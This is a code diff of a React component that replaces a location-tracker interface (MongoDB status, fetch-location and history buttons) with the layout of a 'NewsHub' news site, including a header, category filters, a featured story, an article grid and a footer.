-          <h1 style={styles.title}>📍 Location Tracker</h1>
-          <div style={styles.dbStatus}>
-            {mongoClient ? '✅ Connected to MongoDB Atlas' : '❌ Not connected to MongoDB'}
-          </div>
-          
-          <SetupInstructions />
-          
-          <StatusDisplay />
-          
-          <LocationInfo location={currentLocation} />
-          
-          <div>
-            <button
-              onClick={fetchLocation}
-              disabled={isLoading}
-              style={isLoading ? {...styles.button, ...styles.buttonDisabled} : styles.button}
-              onMouseEnter={handleButtonHover}
-              onMouseLeave={handleButtonLeave}
-            >
-              🔄 {isLoading ? 'Fetching...' : 'Get New Location'}
-            </button>
-            
-            <button
-              onClick={refreshLocations}
-              disabled={isLoading || !mongoClient}
-              style={(isLoading || !mongoClient) ? {...styles.button, ...styles.buttonDisabled} : styles.button}
-              onMouseEnter={handleButtonHover}
-              onMouseLeave={handleButtonLeave}
-            >
-              📋 Refresh History
-            </button>
-          </div>
-          
-          <LocationHistory />
+    <div style={styles.container}>
+      {/* Header */}
+      <header style={styles.header}>
+        <div style={styles.headerContent}>
+          <div style={styles.logo}>NewsHub</div>
+          <nav style={styles.nav}>
+            <a href="#" style={styles.navLink}>Home</a>
+            <a href="#" style={styles.navLink}>World</a>
+            <a href="#" style={styles.navLink}>Politics</a>
+            <a href="#" style={styles.navLink}>Opinion</a>
+            <div style={styles.searchContainer}>
+              <input
+                type="text"
+                placeholder="Search news..."
+                style={styles.searchInput}
+                value={searchQuery}
+                onChange={(e) => setSearchQuery(e.target.value)}
+              />
+              <span style={{color: '#ccc', marginLeft: '0.5rem'}}>🔍</span>
+            </div>
+          </nav>
         </div>
-      </div>
-    </>
+      </header>
+
+      {/* Main Content */}
+      <main style={styles.main}>
+        {/* Category Filter */}
+        <div style={styles.categoryBar}>
+          {newsCategories.map(category => (
+            <button
+              key={category}
+              style={{
+                ...styles.categoryButton,
+                ...(selectedCategory === category ? styles.categoryButtonActive : {})
+              }}
+              onClick={() => setSelectedCategory(category)}
+            >
+              {category}
+            </button>
+          ))}
+        </div>
+
+        {/* Featured Article */}
+        {featuredArticle && selectedCategory === 'all' && (
+          <section style={styles.featuredSection}>
+            <h2 style={styles.featuredTitle}>Featured Story</h2>
+            <div 
+              className="featured"
+              style={styles.featuredCard}
+              onMouseEnter={handleCardHover}
+              onMouseLeave={handleCardLeave}
+            >
+              <img 
+                src={featuredArticle.image} 
+                alt={featuredArticle.title}
+                style={styles.featuredImage}
+              />
+              <div style={styles.featuredContent}>
+                <div style={styles.categoryTag}>{featuredArticle.category}</div>
+                <h3 style={styles.articleTitle}>{featuredArticle.title}</h3>
+                <p style={styles.articleSummary}>{featuredArticle.summary}</p>
+                <div style={styles.articleMeta}>
+                  <span>By {featuredArticle.author} • {formatDate(featuredArticle.publishedAt)}</span>
+                  <span>{featuredArticle.readTime}</span>
+                </div>
+              </div>
+            </div>
+          </section>
+        )}
+
+        {/* News Grid */}
+        <div style={styles.newsGrid}>
+          {regularArticles.map(article => (
+            <div
+              key={article.id}
+              style={styles.newsCard}
+              onMouseEnter={handleCardHover}
+              onMouseLeave={handleCardLeave}
+            >
+              <img 
+                src={article.image} 
+                alt={article.title}
+                style={styles.newsImage}
+              />
+              <div style={styles.newsContent}>
+                <div style={styles.categoryTag}>{article.category}</div>
+                <h3 style={styles.newsTitle}>{article.title}</h3>
+                <p style={styles.newsSummary}>{article.summary}</p>
+                <div style={styles.articleMeta}>
+                  <span>By {article.author}</span>
+                  <span>{article.readTime}</span>
+                </div>
+                <div style={{...styles.articleMeta, marginTop: '0.5rem'}}>
+                  <span>{formatDate(article.publishedAt)}</span>
+                </div>
+              </div>
+            </div>
+          ))}
+        </div>
+      </main>
+
+      {/* Footer */}
+      <footer style={styles.footer}>
+        <div style={styles.footerContent}>
+          <div style={styles.logo}>NewsHub</div>
+          <p style={styles.footerText}>
+            Your trusted source for breaking news and in-depth analysis
+          </p>
+          <p style={{...styles.footerText, marginTop: '1rem'}}>
+            © 2024 NewsHub. All rights reserved.
+          </p>
+        </div>
+      </footer>
+    </div>
   );
 };
 
-export default LocationTracker;
+export default NewsWebsite;
